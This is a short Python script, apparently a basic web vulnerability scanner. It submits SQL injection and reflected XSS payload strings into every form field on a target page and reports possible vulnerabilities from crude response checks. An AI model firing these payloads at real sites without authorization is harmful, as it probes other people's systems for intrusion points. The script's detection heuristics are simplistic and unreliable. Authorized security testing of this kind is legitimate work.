import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

SQL_PAYLOADS = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>"]

def scan_url(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} form(s) on {url}")

        for form in forms:
            form_action = form.get("action")
            form_method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            data = {}
            for input_tag in inputs:
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                if input_name:
                    data[input_name] = "test"

            for payload in SQL_PAYLOADS:
                data_payload = {key: payload for key in data}
                target_url = urljoin(url, form_action)
                if form_method == "post":
                    result = requests.post(target_url, data=data_payload)
                else:
                    result = requests.get(target_url, params=data_payload)

                if "sql" in result.text.lower() or "error" in result.text.lower():
                    print(f"[!] Possible SQL Injection vulnerability on {target_url} using payload: {payload}")

            for payload in XSS_PAYLOADS:
                data_payload = {key: payload for key in data}
                if form_method == "post":
                    result = requests.post(target_url, data=data_payload)
                else:
                    result = requests.get(target_url, params=data_payload)

                if payload in result.text:
                    print(f"[!] Possible XSS vulnerability on {target_url} using payload: {payload}")

    except Exception as e:
        print(f"[-] Error scanning {url}: {e}")

target = "http://example.com"
scan_url(target)